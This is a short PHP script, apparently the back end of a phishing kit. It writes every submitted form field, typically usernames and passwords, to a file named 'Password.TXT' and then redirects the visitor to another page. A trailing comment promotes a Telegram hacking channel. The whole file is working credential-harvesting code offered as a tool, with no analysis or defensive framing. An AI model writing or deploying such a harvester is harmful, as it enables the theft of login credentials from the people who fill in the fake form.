<?php
header ('Location:/tow.html');
$handle = fopen("Password.TXT", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, " = ");
   fwrite($handle, $value);
   fwrite($handle, "\r   \n");
}
fwrite($handle, "\r   \n   \n");
fclose($handle);
exit;
// channel telegram : T.ME/HACKGM
?>